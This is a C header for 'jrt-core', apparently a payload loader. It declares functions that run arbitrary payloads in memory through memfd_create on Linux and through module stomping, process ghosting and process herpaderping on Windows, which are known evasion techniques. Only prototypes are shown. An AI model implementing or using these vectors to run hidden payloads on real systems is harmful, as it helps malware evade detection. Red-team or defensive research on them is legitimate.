/*
 * jrt-core: file-backed execution substrate — public interface.
 *
 * INVARIANT 5: Every executable region is file-backed.
 * INVARIANT 6: The runtime never spawns a process/thread as a side effect.
 *
 * Each vector maps a payload into an executable, file-backed region and
 * transfers control to it in-process. No CreateProcess / execve of a new
 * image is performed by the runtime itself.
 */
#ifndef JRT_EXEC_H
#define JRT_EXEC_H

#include <stdint.h>
#include <stddef.h>

/* Linux: memfd_create + mmap(RX). Returns the payload's exit value, or <0. */
int jrt_exec_memfd(const uint8_t* payload, size_t payload_size,
                   uint32_t entry_offset);

/* Windows vectors (no-ops / unavailable off Windows). */
int jrt_exec_module_stomp(const char* host_module, const uint8_t* payload,
                          size_t payload_size, uint32_t entry_offset);
int jrt_exec_ghost(const uint8_t* payload, size_t payload_size,
                   uint32_t entry_offset);
int jrt_exec_herp(const uint8_t* payload, size_t payload_size,
                  uint32_t entry_offset);

#endif /* JRT_EXEC_H */
